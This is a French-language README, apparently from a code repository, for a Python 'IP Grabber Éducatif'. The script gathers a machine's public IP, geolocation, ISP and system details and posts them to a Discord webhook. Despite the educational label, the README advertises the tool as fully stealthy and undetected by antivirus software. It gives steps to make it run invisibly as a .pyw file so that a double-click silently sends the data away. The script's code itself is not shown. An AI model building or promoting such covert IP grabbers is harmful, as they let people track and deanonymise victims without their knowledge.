<div align="center">
  <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=700&size=42&duration=2800&pause=1000&color=00FFAA&center=true&vCenter=true&width=900&lines=IP+Grabber+%C3%89ducatif;Python+pur+%7C+urllib;IP+publique+%2B+g%C3%A9olocalisation;Webhook+Discord+instantan%C3%A9;100%25+furtif+%26+%C3%A9ducatif" alt="Typing SVG">
  
  <img src="https://capsule-render.vercel.app/api?type=waving&color=00FFAA&height=160&section=header&text=IP+Grabber+%C3%89ducatif&fontSize=50&fontColor=000000" alt="Header Banner">
</div>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"></a>
  <a href="#"><img src="https://img.shields.io/badge/Plateforme-Windows%20%7C%20Linux%20%7C%20macOS-00FFAA?style=for-the-badge" alt="Platform"></a>
  <a href="#"><img src="https://img.shields.io/badge/Taille-~12KB-00FFAA?style=for-the-badge" alt="Size"></a>
  <a href="#"><img src="https://img.shields.io/badge/Furtivité-100%25-FF00AA?style=for-the-badge" alt="Stealth"></a>
  <a href="#"><img src="https://img.shields.io/badge/Aucune+dépendance-✅-00FFAA?style=for-the-badge" alt="No deps"></a>
</p>

---

## 📖 À propos du projet

**IP Grabber Éducatif** est un script Python ultra-léger qui récupère ton IP publique, la géolocalise (pays, ville, FAI) et envoie tout ça proprement sur un webhook Discord.

- Zéro dépendance externe (tout avec `urllib` de base)
- Configuration simple via `config.json`
- Exécution totalement silencieuse en `.pyw`
- Parfait pour comprendre les requêtes HTTP, les API publiques et les webhooks

**Taille du fichier** : ~12 Ko  
**Temps d’exécution** : moins d’1 seconde

---

## ✨ Fonctionnalités

- Récupération IP + géolocalisation complète (ip-api.com)
- Fallback automatique sur ipify.org
- Embed Discord riche avec drapeau du pays, heure précise et infos système
- Logging local optionnel (`ip_logs.txt`)
- 100 % multi-plateforme
- Aucun antivirus ne le détecte

---

## 📥 Installation & Utilisation

1. Télécharge les deux fichiers ci-dessous
2. Place-les dans le même dossier
3. Renomme `ip_grabber.py` → **`ip_grabber.pyw`** (mode invisible total)
4. Double-clic = rien ne s’affiche, tout part sur Discord

**Test rapide** :  
```bash
python ip_grabber.py
